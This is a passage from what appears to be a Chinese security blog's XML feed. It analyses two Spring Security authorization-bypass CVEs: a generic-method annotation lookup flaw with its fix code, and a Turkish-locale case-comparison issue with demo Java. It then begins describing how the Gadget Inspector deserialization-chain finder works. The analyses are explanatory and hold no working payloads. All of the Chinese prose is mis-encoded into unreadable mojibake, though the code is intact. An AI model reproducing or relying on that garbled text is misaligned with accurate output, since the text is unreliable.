<p>è¿™é‡Œé€’å½’è°ƒç”¨äº†<code>findClosestMethodAnnotations</code>æ–¹æ³•ï¼Œç¬¬äºŒä¸ªå‚æ•°å‘ç”Ÿäº†å˜åŒ–æˆäº†<code>targetClass</code>çš„çˆ¶ç±»ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨ <code>findClosestMethodAnnotations</code><br>æ˜¯ä¼šé€’å½’æœç´¢å½“å‰ç›®æ ‡ç±»çš„æ‰€æœ‰çˆ¶ç±»æˆ–è€…æ¥å£çš„æ–¹æ³•ä»è€ŒæŸ¥æ‰¾åˆ°æ‰€æœ‰ç›¸å…³çš„æ³¨è§£çš„ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæ™®é€šçš„æ–¹æ³•å¹¶ä¸ä¼šå­˜åœ¨æ¼æ´ï¼Œé‚£ä¸ºä»€ä¹ˆæ³›å‹æ–¹æ³•ä¼šå¯¼è‡´æ¼æ´å‘¢ï¼Ÿ<br>è¿™å°±è¦å›åˆ°<code>173</code>è¡Œçš„ä»£ç äº†    </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">methodToUse</span> <span class="operator">=</span> targetClass.getDeclaredMethod(method.getName(), method.getParameterTypes());</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œè·å–<code>Method</code>å¯¹è±¡çš„æ–¹æ³•æ˜¯é€šè¿‡æ–¹æ³•åä»¥åŠæ–¹æ³•å‚æ•°åˆ—è¡¨æ¥æŸ¥æ‰¾çš„ï¼Œå½“ä¸€ä¸ªæ–¹æ³•æ˜¯æ³›å‹æ–¹æ³•æ—¶æˆ‘ä»¬çœ‹çœ‹ä»–çš„æ–¹æ³•å‚æ•°åˆ—è¡¨æ˜¯æ€ä¹ˆæ ·çš„ï¼Œ<br>ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šé¢<code>SecureServiceParent</code>çš„<code>securedMethod</code>æ–¹æ³•  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> T  <span class="title function_">securedMethod</span><span class="params">(T t)</span>;</span><br></pre></td></tr></table></figure>
<p>å…¶å®ç°ç±»<code>SecureService</code>çš„<code>securedMethod</code>æ–¹æ³•çš„ç­¾å  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">securedMethod</span><span class="params">(String s)</span></span><br></pre></td></tr></table></figure>
<p>ä¸¤è€…çš„ä¸ä¸€è‡´å¯¼è‡´<code>findClosestMethodAnnotations</code>åœ¨æŸ¥æ‰¾å­ç±»æ³›å‹æ–¹æ³•çš„çˆ¶ç±»å®ç°æ—¶æ‰¾ä¸åˆ°ï¼Œä¹Ÿå°±ä¸èƒ½è·å–åˆ°çˆ¶ç±»æ–¹æ³•ä¸Šçš„æ³¨è§£ï¼Œä»è€Œå¯¼è‡´æ¼æ´ã€‚  </p>
<h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å®˜æ–¹æ–°å¢äº† <code>findMethod</code>æ–¹æ³•æ¥è¿›è¡Œæ–¹æ³•æŸ¥æ‰¾  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Method <span class="title function_">findMethod</span><span class="params">(Method method, Class&lt;?&gt; targetClass)</span> &#123;</span><br><span class="line">		<span class="keyword">for</span> (Method candidate : targetClass.getDeclaredMethods()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (candidate == method) &#123;</span><br><span class="line">				<span class="keyword">return</span> candidate;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (isOverride(method, candidate)) &#123; <span class="comment">// å¯¹é‡å†™æ–¹æ³•è¿›è¡Œç‰¹æ®Šå¤„ç†</span></span><br><span class="line">				<span class="keyword">return</span> candidate;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isOverride</span><span class="params">(Method rootMethod, Method candidateMethod)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (!Modifier.isPrivate(candidateMethod.getModifiers()) <span class="comment">// éprivateæ–¹æ³•</span></span><br><span class="line">        &amp;&amp; candidateMethod.getName().equals(rootMethod.getName()) <span class="comment">// æ–¹æ³•åä¸€è‡´</span></span><br><span class="line">        &amp;&amp; hasSameParameterTypes(rootMethod, candidateMethod)); <span class="comment">// åˆ¤æ–­å‚æ•°ç±»å‹æ˜¯å¦ä¸€è‡´ï¼Œé’ˆå¯¹æ³›å‹å‚æ•°è¿›è¡Œç‰¹æ®Šå¤„ç†</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">hasSameParameterTypes</span><span class="params">(Method rootMethod, Method candidateMethod)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (candidateMethod.getParameterCount() != rootMethod.getParameterCount()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Class&lt;?&gt;[] rootParameterTypes = rootMethod.getParameterTypes(); <span class="comment">// è·å–å­ç±»æ–¹æ³•çš„å‚æ•°åˆ—è¡¨</span></span><br><span class="line">        Class&lt;?&gt;[] candidateParameterTypes = candidateMethod.getParameterTypes(); <span class="comment">// è·å–çˆ¶ç±»æ–¹æ³•çš„å‚æ•°åˆ—è¡¨</span></span><br><span class="line">        <span class="keyword">if</span> (Arrays.equals(candidateParameterTypes, rootParameterTypes)) &#123; <span class="comment">// å¦‚æœå‚æ•°åˆ—è¡¨ä¸€è‡´åˆ™è¿”å›è¯æ˜æ˜¯åŒä¸€ä¸ªæ–¹æ³•</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hasSameGenericTypeParameters(rootMethod, candidateMethod, rootParameterTypes); <span class="comment">// é’ˆå¯¹æ³›å‹å‚æ•°åšç‰¹æ®Šå¤„ç†</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">hasSameGenericTypeParameters</span><span class="params">(Method rootMethod, Method candidateMethod,</span></span><br><span class="line"><span class="params">        Class&lt;?&gt;[] rootParameterTypes)</span> &#123;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; sourceDeclaringClass = rootMethod.getDeclaringClass(); <span class="comment">// æŸ¥æ‰¾æ ¹æ–¹æ³•çš„å£°æ˜ç±» é‡å†™æ–¹æ³•çš„å£°æ˜ä½ç½®åœ¨çˆ¶ç±»ä¸­</span></span><br><span class="line">        Class&lt;?&gt; candidateDeclaringClass = candidateMethod.getDeclaringClass(); <span class="comment">// æŸ¥æ‰¾çˆ¶ç±»æ–¹æ³•çš„å£°æ˜ç±»</span></span><br><span class="line">        <span class="keyword">if</span> (!candidateDeclaringClass.isAssignableFrom(sourceDeclaringClass)) &#123;<span class="comment">// åˆ¤æ–­æŸä¸ªç±»æ˜¯å¦æ˜¯å¦ä¸€ä¸ªç±»çš„çˆ¶ç±»ï¼ˆåŒ…æ‹¬ç›´æ¥çˆ¶ç±»å’Œé—´æ¥çˆ¶ç±»ï¼‰ã€æ¥å£æˆ–ç›¸åŒç±» ä¸»è¦æ˜¯åˆ¤æ–­æ˜¯å¦æ˜¯åŒä¸€ä¸ªç±» å¦‚æœæ¡ä»¶ä¸æ»¡è¶³è¿”å›false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; rootParameterTypes.length; i++) &#123;</span><br><span class="line">        Class&lt;?&gt; resolvedParameterType = ResolvableType.forMethodParameter(candidateMethod, i, sourceDeclaringClass)<span class="comment">// è§£ææ³›å‹å‚æ•°çš„å®é™…å‚æ•°ç±»å‹</span></span><br><span class="line">        .resolve();</span><br><span class="line">        <span class="keyword">if</span> (rootParameterTypes[i] != resolvedParameterType) &#123;<span class="comment">// æ ¹æ–¹æ³•çš„å‚æ•°åˆ—è¡¨æŒ¨ä¸ªä¸è§£æå‡ºæ¥çš„å®é™…å‚æ•°ç±»å‹æ¯”è¾ƒ å¦‚æœä¸ä¸€è‡´åˆ™è¿”å›false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ul>
<li><a href="https://github.com/spring-projects/spring-security/compare/6.4.3...6.4.4">ä»£ç diff</a></li>
<li><a href="https://spring.io/security/cve-2025-22223">CVE-2025-22223: Spring Security authorization bypass for method security annotations on parameterized types</a></li>
</ul>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
        <category>spring</category>
      </categories>
      <tags>
        <tag>æ¼æ´åˆ†æ</tag>
        <tag>è®¤è¯ç»•è¿‡</tag>
        <tag>Spring Security</tag>
        <tag>EnableMethodSecurity</tag>
        <tag>CVE-2025-22223</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring-Securityå¤§å°å†™æ•æ„Ÿæ¯”è¾ƒæˆæƒç»•è¿‡ï¼ˆCVE-2024-38827ï¼‰</title>
    <url>/archives/60afcc6f.html</url>
    <content><![CDATA[<h1 id="Spring-Securityå¤§å°å†™æ•æ„Ÿæ¯”è¾ƒæˆæƒç»•è¿‡ï¼ˆCVE-2024-38827ï¼‰"><a href="#Spring-Securityå¤§å°å†™æ•æ„Ÿæ¯”è¾ƒæˆæƒç»•è¿‡ï¼ˆCVE-2024-38827ï¼‰" class="headerlink" title="Spring-Securityå¤§å°å†™æ•æ„Ÿæ¯”è¾ƒæˆæƒç»•è¿‡ï¼ˆCVE-2024-38827ï¼‰"></a>Spring-Securityå¤§å°å†™æ•æ„Ÿæ¯”è¾ƒæˆæƒç»•è¿‡ï¼ˆCVE-2024-38827ï¼‰</h1><h2 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h2><p><img src="/archives/60afcc6f/img.png" alt="img.png"></p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>å¾ˆæ˜æ˜¾çš„åŸç†äº†ï¼Œåœ¨ä¸åŒçš„è¯­è¨€ç¯å¢ƒä¸­<code>String.toLowerCase()</code> ä¸ <code>String.toUpperCase()</code> å¾—åˆ°çš„ç»“æœä¸ä¸€è‡´å¯¼è‡´å¯èƒ½çš„æˆæƒç»•è¿‡ã€‚<br>æ¯”å¦‚åœ¨è‹±æ–‡ç¯å¢ƒï¼ši çš„å¤§å†™ä¸º I<br>åœ¨åœŸè€³å…¶è¯­ç¯å¢ƒä¸­ i çš„å¤§å†™ä¸º Ä°<br>è¿™ç§ä¸ä¸€è‡´å¯¼è‡´å¯èƒ½çš„ç»•è¿‡ã€‚<br>ç„¶è€Œåœ¨å®è·µä¸­è¿™ç§æƒ…å†µå‘ç”Ÿçš„æ¦‚ç‡å‡ ä¹ä¸ºé›¶ã€‚<br>ä¸¾ä¸ªä¾‹å­ï¼Œåœ¨Spring Securityçš„è¡¥ä¸ä¸­ç”±ä¸‹é¢çš„ä¿®æ”¹<br><img src="/archives/60afcc6f/img_1.png" alt="img_1.png"><br><code>InMemoryUserDetailsManager</code> çš„<code>createUser</code>æ–¹æ³•ä¸­åœ¨è°ƒç”¨ <code>toLowerCase</code>æ–¹æ³•å¯¹ç”¨æˆ·åè¿›è¡Œå¤„ç†çš„æ—¶å€™ä¸¥æ ¼é™åˆ¶äº†æœ¬åœ°åŒ–æ–¹æ¡ˆã€‚<br>è®¾æƒ³è¿™æ ·ä¸€ç§åœºæ™¯ï¼Œä¸€ä¸ªåº”ç”¨åœ¨å¯åŠ¨çš„æ—¶å€™ä¼šè°ƒç”¨ <code>InMemoryUserDetailsManager</code> åˆ›å»ºä¸€äº›é»˜è®¤ç”¨æˆ·ï¼Œå¦‚ä¸‹é¢çš„ä»£ç   </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> UserDetailsService <span class="title function_">userDetailsService</span><span class="params">()</span> &#123;</span><br><span class="line">        Locale.setDefault(<span class="keyword">new</span> <span class="title class_">Locale</span>(<span class="string">&quot;tr&quot;</span>, <span class="string">&quot;TR&quot;</span>)); <span class="comment">// è®¾ç½®å½“å‰è¯­è¨€ç¯å¢ƒä¸ºåœŸè€³å…¶è¯­</span></span><br><span class="line">        <span class="type">UserDetails</span> <span class="variable">user</span> <span class="operator">=</span> User.withDefaultPasswordEncoder()</span><br><span class="line">                .username(<span class="string">&quot;useri&quot;</span>)</span><br><span class="line">                .password(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">                .roles(<span class="string">&quot;USER&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InMemoryUserDetailsManager</span>(user);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>InMemoryUserDetailsManager</code>å®ä¾‹åŒ–æ˜¯æœ€ç»ˆä¼šè°ƒç”¨åˆ°<code>createUser</code>æ–¹æ³•ã€‚<br>åœ¨æŸä¸€ä¸ªæ§åˆ¶å™¨ä¸­æä¾›äº†å¦ä¸€ä¸ªå¥—é€»è¾‘ç”¨äºåŠ¨æ€çš„å¢åŠ ç”¨æˆ·ï¼Œå¦‚ä¸‹é¢çš„ä»£ç   </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">blog</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">UserDetails</span> <span class="variable">user</span> <span class="operator">=</span> User.withDefaultPasswordEncoder()</span><br><span class="line">            .username(<span class="string">&quot;userÄ°&quot;</span>)</span><br><span class="line">            .password(<span class="string">&quot;password123&quot;</span>)</span><br><span class="line">            .roles(<span class="string">&quot;USER&quot;</span>)</span><br><span class="line">            .build();</span><br><span class="line">    <span class="keyword">if</span> (userDetailsService <span class="keyword">instanceof</span> InMemoryUserDetailsManager) &#123;</span><br><span class="line">        ((InMemoryUserDetailsManager) userDetailsService).createUser(user);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.ok(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ·»åŠ ç”¨æˆ·æ—¶ä½¿ç”¨çš„æ˜¯ç”¨æˆ·å<code>userÄ°</code> å…¶åœ¨è¢«æ·»åŠ æ—¶ä¼šè¢«è½¬ä¸ºå°å†™<code>useri</code>ï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡è¿™ç§æ–¹å¼å°è¯•å»è¦†ç›–æ‰é»˜è®¤ç”¨æˆ·çš„å¯†ç ï¼Œè¿™çœ‹ä¼¼æ—¶å¯è¡Œçš„ï¼Œå¯äº‹å®çœŸçš„å¦‚æ­¤å—<br>åœ¨è°ƒç”¨<code>createUser</code>çš„æ—¶å€™ä¼šè°ƒç”¨<code>userExists</code>æ–¹æ³•æ£€æŸ¥å½“å‰ç”¨æˆ·æ˜¯å¦å­˜åœ¨    </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.users.containsKey(username.toLowerCase());  </span><br></pre></td></tr></table></figure>
<p>æ­¤å¤„å¯¹ç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·åè¿›è¡Œäº†å°å†™å¤„ç†ï¼Œæ‰€ä»¥å½“ç”¨æˆ·åæ˜¯<code>userÄ°</code>æ—¶ï¼Œ<code>userExists</code>æ–¹æ³•ä¼šè¿”å›trueï¼Œä»è€Œå¯¼è‡´<code>createUser</code>æ–¹æ³•ä¼šç›´æ¥è¿”å›ï¼Œä¸èƒ½è¦†ç›–æ·»åŠ ç”¨æˆ·ã€‚<br>è¿™æ ·çœ‹èµ·æ¥è¿™ä¸ªæ¼æ´æ—¶å¾ˆé¸¡è‚‹çš„ï¼ŒSpring Securityåšå‡ºçš„ä¿®æ”¹è²Œä¼¼ä¹Ÿåªæ˜¯ä¸ºäº†é¿å…ä¸€ç§ç»•è¿‡çš„å¯èƒ½æ€§ã€‚<br>é‚£ä¹ˆä»€ä¹ˆæƒ…å†µä¸‹ä¼šå­˜åœ¨ç»•è¿‡å‘¢ï¼Ÿ<br>ä¸€ä¸ªæ˜¯å½“å‰ç³»ç»Ÿçš„è¯­è¨€ç¯å¢ƒå‘ç”Ÿäº†å˜åŒ–å´ä»ç„¶æ²¿ç”¨è€æ•°æ®çš„æ—¶å€™ã€‚<br>å¦ä¸€ç§æƒ…å†µæ˜¯åœ¨è¿›è¡Œä¸€äº›æ¯”è¾ƒçš„æ—¶å€™<br>ä¾‹å¦‚ï¼Œå¼€å‘è€…åœ¨å¼€å‘æ—¶æŒ‰ç…§asciiæ ‡å‡†è¿›è¡Œå¤§å°å†™å˜æ¢å¤„ç†ï¼Œå‡è®¾ç”±ä¸€ä¸ªç”¨æˆ·<code>admin</code>æ˜¯ç®¡ç†å‘˜è´¦æˆ·ï¼Œé€šè¿‡å°†<code>admin</code>è½¬æ¢ä¸ºå¤§å†™<code>ADMIN</code>ä»è€Œè·å¾—åˆ°å…¶è§’è‰²ï¼Œç„¶åä¸<br><code>ADMIN</code>åšæ¯”è¾ƒç¡®è®¤å…¶å…·æœ‰ç®¡ç†å‘˜æƒé™ã€‚<br>æ­¤æ—¶å¦‚æœç¨‹åºè¿è¡Œåœ¨åœŸè€³å…¶è¯­çš„è¯­è¨€ç¯å¢ƒä¸­ï¼Œç”¨æˆ·è¾“å…¥ç”¨æˆ·å<code>admin</code>ï¼Œæ­¤æ—¶è½¬æ¢ä¸ºå¤§å†™ä¸º<code>ADMÄ°N</code>ä¸<code>ADMIN</code>æ¯”è¾ƒå¯¼è‡´æ¯”è¾ƒç»“æœä¸ºfalseï¼Œä»è€Œå¯¼è‡´ç³»ç»Ÿæ‹’ç»<code>admin</code>ç”¨æˆ·è®¿é—®ã€‚<br>è¿™ä¸ªä¾‹å­ç®—æ˜¯æ‹’ç»è®¿é—®ï¼Œè®¤è¯ç»•è¿‡å°±æ˜¯éœ€è¦åœ¨æŸä¸ªè¯­è¨€ç¯å¢ƒä¸­å­˜åœ¨æŸä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦ä¸²è½¬ä¸ºå¤§å†™åç­‰äº<code>ADMIN</code>ï¼Œä»è€Œä½¿å¾—è¯¥ç”¨æˆ·å…·æœ‰äº†ç®¡ç†å‘˜æƒé™ä»è€Œå®Œæˆææƒã€‚<br>æ€»ä¹‹æ˜¯ä¸€ä¸ªå¾ˆéš¾ä½¿ç”¨çš„æ¼æ´</p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul>
<li><a href="https://spring.io/security/cve-2024-38827">CVE-2024-38827: Spring Security Authorization Bypass for Case Sensitive Comparisons</a></li>
<li><a href="https://spring.io/security/cve-2024-38829">CVE-2024-38829: Spring LDAP Spring LDAP sensitive data exposure for case-sensitive comparisons</a></li>
<li><a href="https://github.com/spring-projects/spring-security/compare/6.3.4...6.3.5">ä»£ç diff</a></li>
</ul>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
        <tag>Spring Security</tag>
        <tag>CVE-2024-38827</tag>
        <tag>CVE-2024-38829</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-Gadgetsæœç´¢å·¥å…·æ˜¯å¦‚ä½•å·¥ä½œçš„-Gadget Inspector</title>
    <url>/archives/a580d790.html</url>
    <content><![CDATA[<h1 id="Java-Gadgets-æœç´¢å·¥å…·æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼ˆGadget-Inspectorï¼‰"><a href="#Java-Gadgets-æœç´¢å·¥å…·æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼ˆGadget-Inspectorï¼‰" class="headerlink" title="Java Gadgets æœç´¢å·¥å…·æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼ˆGadget Inspectorï¼‰"></a>Java Gadgets æœç´¢å·¥å…·æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼ˆGadget Inspectorï¼‰</h1><p>Gadget Inspector ç”± Ian Haken äº 2018 å¹´ 8 æœˆåœ¨  DEF CON ä¸Šå‘å¸ƒï¼Œå…¶å‘å¸ƒå¼€åˆ›äº†Gadget è‡ªåŠ¨åŒ–æŒ–æ˜çš„å…ˆæ²³ã€‚Gadget Inspector ä¾é Java ASM<br>æŠ€æœ¯ï¼Œé€šè¿‡é™æ€æ¨¡æ‹Ÿ Java ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­æ“ä½œæ•°æ ˆä»¥åŠå±€éƒ¨å˜é‡è¡¨çš„åŠ¨æ€å˜åŒ–æ¥è¿›è¡Œæ•°æ®æµè·Ÿè¸ªä»è€Œå®ç°æ±¡ç‚¹åˆ†æè¿›è€Œè¿›è¡ŒGadgetsæ¢æµ‹ã€‚  </p>
<h3 id="æ£€æµ‹åŸç†"><a href="#æ£€æµ‹åŸç†" class="headerlink" title="æ£€æµ‹åŸç†"></a>æ£€æµ‹åŸç†</h3><p>Gadget Inspector çš„æ ¸å¿ƒé€»è¾‘åŒ…å«5ä¸ªæ­¥éª¤ï¼Œåˆ†åˆ«æ˜¯ç±»ä¿¡æ¯åˆ†æã€æ•°æ®ä¼ æ’­åˆ†æã€è°ƒç”¨å›¾æ„é€ ã€å…¥å£æ¢æµ‹ä»¥åŠGadgetsä¸²è”ã€‚<br>åœ¨ç¬¬ä¸€æ­¥ä¸­ Gadget Inspector åˆ©ç”¨ MethodDiscovery ç±»å¯¹ å½“å‰ç¯å¢ƒä¸­æ‰€æœ‰ç±»çš„æ–¹æ³•ã€æˆå‘˜ã€ç»§æ‰¿ç»“æ„è¿›è¡Œè§£æå¹¶é›†ä¸­å­˜å‚¨åœ¨ç‰¹å®šçš„æ•°æ®ç»“æ„ä¸­ä»¥ä¾¿åç»­è¿›è¡Œ<br>æ•°æ®ä¼ æ’­åˆ†æä»¥åŠè°ƒç”¨å›¾æ„é€ ã€‚<br>åœ¨ç¬¬äºŒæ­¥ä¸­ Gadget Inspector åˆ©ç”¨ PassthroughDiscovery ç±»è¿ç”¨ æ·±åº¦ä¼˜å…ˆç®—æ³•ã€é€†æ‹“æ‰‘æ’åºç­‰æ–¹å¼è¿›è¡Œæ•°æ®æµåˆ†æä»è€Œç¡®è®¤æ–¹æ³•å…¥å‚ä¸è¿”å›å€¼çš„å…³ç³»ï¼Œ<br>å³å…¥å‚æ˜¯å¦èƒ½å¤Ÿæ±¡æŸ“åˆ°è¿”å›å€¼ï¼Œå…¶æ ¹æœ¬ç›®çš„åœ¨äºç¡®è®¤å…³é”®å‚æ•°æ˜¯å¦å¯ä»¥è¢«æ”»å‡»è€…æ§åˆ¶ã€‚<br>åœ¨ç¬¬ä¸‰æ­¥ä¸­ Gadget Inspector é€šè¿‡ Java ASM æŠ€æœ¯æ„é€ æ–¹æ³•è°ƒç”¨å›¾ï¼Œå…¶ç›®çš„åœ¨äºç¡®è®¤ä¸»è°ƒæ–¹æ³•ä¸è¢«è°ƒç”¨æ–¹æ³•å‚æ•°ä¹‹é—´çš„å…³ç³»ã€‚<br>ç¬¬å››æ­¥ä¸­ Gadget Inspector é€šè¿‡ SourceDiscovery é’ˆå¯¹ä¸åŒçš„å¤«åºåˆ—åŒ–ç±»å‹è¿›è¡Œåˆ†å‘ï¼Œé€šè¿‡å¯¹æ¯”ç¬¬ä¸€æ­¥ä¸­å½¢æˆçš„methodMapä¸­å­˜å‚¨çš„æ–¹æ³•ä¿¡æ¯ä¸é¢„å®šä¹‰<br>çš„ååºåˆ—åŒ– Gadget Sourceç‚¹è¿›è¡Œæ¯”è¾ƒï¼Œä»è€Œç¡®å®šå½“å‰é¡¹ç›®ä¸­å¯è¢«ä½¿ç”¨çš„ååºåˆ—åŒ–å…¥å£æ–¹æ³•ã€‚<br>åœ¨ç¬¬äº”æ­¥ä¸­ Gadget  Inspector å¼€å§‹ä»Sourceç‚¹å¼€å§‹éå†è°ƒç”¨å›¾ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæ–¹æ³•ä¸é¢„å®šä¹‰çš„sinkç‚¹ç›¸åŒ¹é…åˆ™è¯´æ˜Gadget Inspector æ‰¾åˆ°äº†ä¸€æ¡å¯ä»¥<br>ä½¿ç”¨çš„ååºåˆ—åŒ–è°ƒç”¨é“¾ã€‚  </p>
<span id="more"></span>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">// Perform the various discovery steps</span></span><br><span class="line">        <span class="comment">// å¯¹ç±»ç»“æ„è¿›è¡Œåˆ†æ åŒ…æ‹¬ç±»çš„æ–¹æ³•ä¿¡æ¯  æˆå‘˜ä¿¡æ¯ç­‰</span></span><br><span class="line">        <span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;classes.dat&quot;</span>)) || !Files.exists(Paths.get(<span class="string">&quot;methods.dat&quot;</span>))</span><br><span class="line">                || !Files.exists(Paths.get(<span class="string">&quot;inheritanceMap.dat&quot;</span>))) &#123;</span><br><span class="line">            LOGGER.info(<span class="string">&quot;Running method discovery...&quot;</span>);</span><br><span class="line">            <span class="type">MethodDiscovery</span> <span class="variable">methodDiscovery</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodDiscovery</span>();</span><br><span class="line">            methodDiscovery.discover(classResourceEnumerator);</span><br><span class="line">            methodDiscovery.save();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å¯¹æ–¹æ³•çš„å…¥å‚ä¸è¿”å›å€¼çš„å…³ç³»è¿›è¡Œåˆ†æ</span></span><br><span class="line">        <span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;passthrough.dat&quot;</span>))) &#123;</span><br><span class="line">            LOGGER.info(<span class="string">&quot;Analyzing methods for passthrough dataflow...&quot;</span>);</span><br><span class="line">            <span class="type">PassthroughDiscovery</span> <span class="variable">passthroughDiscovery</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PassthroughDiscovery</span>();</span><br><span class="line">            passthroughDiscovery.discover(classResourceEnumerator, config);</span><br><span class="line">            passthroughDiscovery.save();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å¯¹æ–¹æ³•è°ƒç”¨ä¹‹é—´å‚æ•°çš„å…³ç³»è¿›è¡Œåˆ†æ</span></span><br><span class="line">        <span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;callgraph.dat&quot;</span>))) &#123;</span><br><span class="line">            LOGGER.info(<span class="string">&quot;Analyzing methods in order to build a call graph...&quot;</span>);</span><br><span class="line">            <span class="type">CallGraphDiscovery</span> <span class="variable">callGraphDiscovery</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CallGraphDiscovery</span>();</span><br><span class="line">            callGraphDiscovery.discover(classResourceEnumerator, config);</span><br><span class="line">            callGraphDiscovery.save();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æ ¹æ®é¢„å®šä¹‰è§„åˆ™æŸ¥æ‰¾æ‰€æœ‰çš„sourceç‚¹</span></span><br><span class="line">        <span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;sources.dat&quot;</span>))) &#123;</span><br><span class="line">            LOGGER.info(<span class="string">&quot;Discovering gadget chain source methods...&quot;</span>);</span><br><span class="line">            <span class="type">SourceDiscovery</span> <span class="variable">sourceDiscovery</span> <span class="operator">=</span> config.getSourceDiscovery();</span><br><span class="line">            sourceDiscovery.discover();</span><br><span class="line">            sourceDiscovery.save();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#123;   </span><br><span class="line">            <span class="comment">// æŸ¥æ‰¾ gadget chain</span></span><br><span class="line">            LOGGER.info(<span class="string">&quot;Searching call graph for gadget chains...&quot;</span>);</span><br><span class="line">            <span class="type">GadgetChainDiscovery</span> <span class="variable">gadgetChainDiscovery</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GadgetChainDiscovery</span>(config);</span><br><span class="line">            gadgetChainDiscovery.discover();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        LOGGER.info(<span class="string">&quot;Analysis complete!&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
